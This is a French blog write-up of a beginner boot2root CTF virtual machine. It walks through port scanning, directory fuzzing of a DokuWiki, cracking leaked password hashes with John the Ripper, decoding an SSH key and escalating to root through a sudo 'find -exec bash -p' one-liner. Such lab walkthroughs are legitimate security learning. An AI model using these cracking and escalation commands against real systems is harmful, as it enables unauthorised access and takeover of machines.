# Solution du CTF Snowtalks Easy de iamv1nc3nt

Easy Peasy
----------

Je suis tombé récemment [sur ce post sur le subreddit /r/SecurityCTF](https://www.reddit.com/r/securityCTF/comments/sjvhd0/unreleased_boot2root_systems/) d'un certain [iamv1nc3nt](https://twitter.com/iamv1nc3nt).  

Il propose [sur son site](https://iamv1nc3nt.com/) différents CTF sous la forme de VM au format OVA. J'ai pris le premier de la liste histoire d'essayer.  

Je qualifierais le niveau du CTF de *grand débutant*, la description est d'ailleurs explicite :   

> This is an entry level boot2root system with a ton of hand holding.

On commence par le scan de ports classique mais avec les instructions que l'on va croiser on aurait tout simplement taper l'IP de la VM dans le navigateur.  

```plain
$ sudo nmap -sCV -T5 -p- 192.168.56.23 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-07 11:35 CET 
Nmap scan report for 192.168.56.23 
Host is up (0.00018s latency). 
Not shown: 65533 closed tcp ports (reset) 
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 
| ssh-hostkey:  
|   3072 26:b6:0e:1b:43:5f:c6:17:05:8f:4f:72:17:f9:5a:72 (RSA) 
|   256 3e:43:b8:15:17:d3:2b:5e:c6:66:e9:eb:6c:83:be:cc (ECDSA) 
|_  256 5b:4d:c0:8f:89:af:02:38:98:c4:83:7a:32:44:7c:f0 (ED25519) 
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu)) 
|_http-generator: DokuWiki 
| http-title: start [Snowtalks Easy] 
|_Requested resource was http://192.168.56.23/doku.php 
|_http-server-header: Apache/2.4.41 (Ubuntu) 
MAC Address: 08:00:27:00:31:9B (Oracle VirtualBox virtual NIC) 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On a ici un *DokuWiki* qui tourne. En regardant le code source de la page HTML je remarque ceci :  

```html
<!--             username:  hacker                 -->
<!--             password:  hacker123              -->
```

Ces identifiants permettent l'accès au wiki mais une fois sur le Media Manager on a le message *Sorry, you don't have enough rights to upload files.*  

Dans les pages existantes on trouve un article sur l'utilisation de fuzzers de style dirbuster ou gobuster. Il y a aussi une image uploadée correspondant à un GTFObin pour la commande *find*.  

En toute logique je lance *feroxbuster* sur le site :  

```plain
$ feroxbuster -u http://192.168.56.23/ -w /tools/fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.23/
 🚀  Threads               │ 50
 📖  Wordlist              │ /tools/fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
403        9l       28w      278c http://192.168.56.23/bin
403        9l       28w      278c http://192.168.56.23/data
301        9l       28w      312c http://192.168.56.23/lib
403        9l       28w      278c http://192.168.56.23/inc
200       91l      294w     2030c http://192.168.56.23/users
403        9l       28w      278c http://192.168.56.23/conf
403        9l       28w      278c http://192.168.56.23/README
403        9l       28w      278c http://192.168.56.23/vendor
403        9l       28w      278c http://192.168.56.23/VERSION
403        9l       28w      278c http://192.168.56.23/server-status
302        0l        0w        0c http://192.168.56.23/
403        9l       28w      278c http://192.168.56.23/_html
403        9l       28w      278c http://192.168.56.23/_htaccess
403        9l       28w      278c http://192.168.56.23/COPYING
403        9l       28w      278c http://192.168.56.23/_htc
403        9l       28w      278c http://192.168.56.23/_htmleditor
[####################] - 21s    62260/62260   0s      found:16      errors:0
```

Je ne suis pas un expert *DokuWiki* donc aucune URL ne me paraissait particulièrement anormale. J'ai tout de même accédé en premier à l'URL */users* qui retournait un code 200.  

Je ne met pas l'ensemble du texte trouvé mais voici le principal :  

```plain
--------------------------------------------------- 

Before I forget, I've created the following user: 

cypher:$6$oRt1RjppBhbT6LBv$B0Ium534jtFICuP6rR8lxNydTUUKCs/nq3J1BACCc/v/Mfmbd4nGZTM7Ew1wT/75f/TIQpJAjaNNUjDdD5dTu1:18991:0:99999:7::: 

---------------------------------------------------

--- snip ---
Once you crack the hash, login to the server using:  

ssh cyppher@[ IP ADDRESS OF YOUR SERVER ]

For example:  ssh cypher@192.168.99.100

When prompted, enter the password and read the README file.

--- snip ---
```

Le texte proposait d'utilisait hashcat mais ça marche bien sûr tout aussi bien avec John The Ripper pour un mot de passe aussi faible :  

```plain
$ john --wordlist=/tools/wordlists/rockyou.txt /tmp/hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iloveyou         (cypher)     
1g 0:00:00:00 DONE (2022-02-07 11:47) 3.846g/s 984.6p/s 984.6c/s 984.6C/s sokar..celtic
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

On trouve une fois connecté un fichier encodé en base64 :  

```plain
cypher@easy-vm:~$ cat base64what | base64 -d 
neo:$6$hgNhPDuhnI2CLzVy$4PYhoCGT24G5DhJT3OCG/7CxXXZ15gLtoSqwt4h5HAATzq4QjXDbrkmzymm/2otJmwFTl9N8ruDQiC2BQKQiy/:18991:0:99999:7::: 

We learn through repition.  Crack this hash, logout, and login as the user:  neo 

When you get logged in, there's another README in the home directory. 

As another side project, you could Google:  "How to switch users Linux command line".
```

Je casse de la même façon le hash qui donne le mot de passe *password123*.  

chmod FTW
---------

Un nouveau README à cette étape, là encore ça s'adresse plus aux débutants Linux :  

```plain
Welcome to the real world, Neo. 

In the home directory, there's a file:  trinity-key 

This is a two part problem.   

Problem # 1, you can't read the file. 

When we look at the directory, isolating the two files, we see: 

-rw-rw-r-- 1 neo  neo   153 Dec 30 18:45 README 
---------- 1 neo  neo  3518 Dec 30 18:43 trinity-key

--- snip ---
```

Ce fichier, une fois les permissions corrigées, contient une clé privée SSH encodée en base64.  

```plain
neo@easy-vm:~$ chmod 600 trinity-key
neo@easy-vm:~$ base64 -d trinity-key > id_rsa 
neo@easy-vm:~$ chmod 600 id_rsa  
neo@easy-vm:~$ ssh -i id_rsa trinity@127.0.0.1 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64) 

 * Documentation:  https://help.ubuntu.com 
 * Management:     https://landscape.canonical.com 
 * Support:        https://ubuntu.com/advantage 

  System information as of Mon 07 Feb 2022 10:53:28 AM UTC 

  System load:  0.03              Processes:               134 
  Usage of /:   50.8% of 8.79GB   Users logged in:         1 
  Memory usage: 13%               IPv4 address for enp0s3: 192.168.56.23 
  Swap usage:   0% 

 * Super-optimized for small spaces - read how we shrank the memory 
   footprint of MicroK8s to make it the smallest full K8s around. 

   https://ubuntu.com/blog/microk8s-memory-optimisation 

0 updates can be applied immediately. 

The list of available updates is more than a week old. 
To check for new updates run: sudo apt update 
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings 

Last login: Thu Dec 30 23:52:06 2021 from 192.168.86.130 
trinity@easy-vm:~$ id 
uid=1001(trinity) gid=1001(trinity) groups=1001(trinity)
```

Finalement on en vient à l'indice du début :  

```plain
trinity@easy-vm:~$ sudo -l 
Matching Defaults entries for trinity on easy-vm: 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 

User trinity may run the following commands on easy-vm: 
    (ALL) NOPASSWD: /usr/bin/find 
trinity@easy-vm:~$ sudo /usr/bin/find README -exec bash -p \; 
root@easy-vm:/home/trinity# id 
uid=0(root) gid=0(root) groups=0(root) 
root@easy-vm:/home/trinity# cd /root/ 
root@easy-vm:~# ls 
root.txt  snap 
root@easy-vm:~# cat root.txt  

   _________                       __         .__   __             _______________   ________  ____    
  /   _____/ ____   ______  _  ___/  |______  |  | |  | __  ______ \_____  \   _  \  \_____  \/_   |   
  \_____  \ /    \ /  _ \ \/ \/ /\   __\__  \ |  | |  |/ / /  ___/  /  ____/  /_\  \  /  ____/ |   |   
  /        \   |  (  <_> )     /  |  |  / __ \|  |_|    <  \___ \  /       \  \_/   \/       \ |   |   
 /_______  /___|  /\____/ \/\_/   |__| (____  /____/__|_ \/____  > \_______ \_____  /\_______ \|___|   
         \/     \/                          \/          \/     \/          \/     \/         \/        
___________                      __________               __________               __             .___ 
\_   _____/____    _________.__. \______   \ _______  ___ \______   \ ____   _____/  |_  ____   __| _/ 
 |    __)_\__  \  /  ___<   |  |  |    |  _//  _ \  \/  /  |       _//  _ \ /  _ \   __\/ __ \ / __ |  
 |        \/ __ \_\___ \ \___  |  |    |   (  <_> >    <   |    |   (  <_> |  <_> )  | \  ___// /_/ |  
/_______  (____  /____  >/ ____|  |______  /\____/__/\_ \  |____|_  /\____/ \____/|__|  \___  >____ |  
        \/     \/     \/ \/              \/            \/         \/                        \/     \/  

I hope you enjoyed this box. 

Twitter:  @iamv1nc3nt
```

Trop guidé pour moi mais bien adapté pour les débutants.

*Published February 07 2022 at 12:22*